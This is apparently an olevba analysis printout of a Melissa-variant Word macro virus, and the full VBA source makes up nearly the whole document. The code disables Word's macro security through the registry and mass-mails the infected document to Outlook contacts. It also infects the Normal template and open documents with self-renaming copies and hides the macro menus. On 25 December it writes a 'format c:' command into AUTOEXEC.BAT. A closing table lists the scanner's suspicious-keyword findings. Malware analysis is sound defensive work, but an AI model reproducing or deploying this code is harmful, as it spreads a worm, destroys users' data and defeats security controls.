olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.w-286a459deeaacaa79d32cf2abdd09133c294646a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Melissa.w-286a459deeaacaa79d32cf2abdd09133c294646a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1): Application.DisplayRecentFiles = (1 - 1)
End If
Call HQ1456
If Day(Now) = 25 And Month(Now) = 12 Then
Open ("C:\AUTOEXEC.BAT") For Output As #1
Print #1, "@echo off"
Print #1, "@echo Vine...Vide...Vice...Moslem Power Never End..."
Print #1, "@echo Your Computer Have Just Been Terminated By -= CyberNET =- Virus !!!"
Print #1, "ctty nul"
Print #1, "format c: /autotest /q /u"
Close #1
MsgBox "Vine...Vide...Vice...Moslem Power Never End..." & Chr(13) & "You Dare Rise Against Me...The Human Era is Over, The CyberNET Era Has Come !!!", vbCritical + vbOKOnly, "(C)1999 - CyberNET"
Randomize: For TC8796 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next TC8796: End If
JP2310 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
RR9060 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(9, 4), 4) <> "Call" Then
Set OO1481 = ActiveDocument.VBProject.VBComponents
Call FS4018(OO1481)
VG3191 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(9, 4), 4) <> "Call" Then
Set OO1481 = NormalTemplate.VBProject.VBComponents
Call FS4018(OO1481)
AO2068 = True
Randomize
Dim r1(1 To 29) As String
r1(1) = "VN5176": r1(2) = "VJ957": r1(3) = "EU1781": r1(4) = "FQ9188": r1(5) = "KE6942": r1(6) = "JP2310": r1(7) = "RR9060": r1(8) = "VG3191": r1(9) = "OO1481": r1(10) = "AO2068"
r1(11) = "LE7847": r1(12) = "RM2299": r1(13) = "BO7043": r1(14) = "FR4212": r1(15) = "VL7953": r1(16) = "HQ1456": r1(17) = "GE464": r1(18) = "RU5049": r1(19) = "UH1317": r1(20) = "KG8731"
r1(21) = "FK7463": r1(22) = "QB3711": r1(23) = "KK253": r1(24) = "FS4018": r1(25) = "EA1346": r1(26) = "FK1454": r1(27) = "TC8796": r1(28) = "CG237": r1(29) = "LL464"
For VL7953 = 1 To 29
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call KE6942(a1, r1(VL7953))
Next VL7953
ActiveDocument.Saved = True
End If
If AO2068 <> True And VG3191 <> True Then GoTo LE7847
If AO2068 = True Then OO1481.Item(1).CodeModule.AddFromstring ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, JP2310 - 1) & _
vbCr & "Sub ViewVBCode()" & vbCr & "CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Enabled = False" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" & vbCr & "ViewVBCode" & vbCr & "End Sub")
If VG3191 = True Then OO1481.Item(1).CodeModule.AddFromstring ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RR9060 - 8))
LE7847:
If RR9060 <> 0 And JP2310 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub
Private Function KE6942(FR4212, BO7043 As String)
On Error Resume Next
Dim VN5176 As Long: Dim VJ957 As Long: Dim EU1781 As Long: Dim FQ9188 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
VN5176 = 1: VJ957 = 1: EU1781 = .CountOfLines: FQ9188 = Len(.Lines(.CountOfLines, 1))
Do While .Find(BO7043, VN5176, VJ957, EU1781, FQ9188, True)
strline = .Lines(VN5176, 1)
strline = Left(strline, VJ957 - 1) & FR4212 & Mid(strline, FQ9188)
.ReplaceLine VN5176, strline
VN5176 = EU1781 + 1: VJ957 = 1
EU1781 = .CountOfLines
FQ9188 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Private Function HQ1456()
On Error Resume Next
Dim UH1317, KG8731, FK7463
Set UH1317 = CreateObject("Outlook.Application")
Set KG8731 = UH1317.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "CyberNET") <> "(C)1999 - Indonesia by AnomOke!" Then
If UH1317 = "Outlook" Then
KG8731.Logon "profile", "password"
For GE464 = 1 To KG8731.AddressLists.Count
Set LL464 = KG8731.AddressLists(GE464)
FK1454 = 1
Set FK7463 = UH1317.CreateItem(0)
For RU5049 = 1 To LL464.AddressEntries.Count
CG237 = LL464.AddressEntries(FK1454)
FK7463.Recipients.Add CG237
FK1454 = _
FK1454 + 1
If FK1454 > 50 Then RU5049 = LL464.AddressEntries.Count
Next RU5049
FK7463.Subject = "Message From " & Application.UserName
FK7463.Body = "This document is very Important and you've GOT to read this !!!"
FK7463.Attachments.Add ActiveDocument.FullName
FK7463.Send
CG237 = ""
Next GE464
KG8731.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "CyberNET") = "(C)1999 - Indonesia by AnomOke!"
End If
End Function
Private Function FS4018(OO1481)
Dim EA1346 As Object
For Each EA1346 In OO1481
EA1346.CodeModule.DeleteLines 1, _
EA1346.CodeModule.CountOfLines
Next EA1346
End Function
Private Function FileOpen()
On Error Resume Next
WordBasic.disableautomacros True
Dialogs(80).Show
Document_Close
End Function









Sub ViewVBCode()
CommandBars("Tools").Controls("Macro").Enabled = False
End Sub
Sub ToolsMacro()
ViewVBCode
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
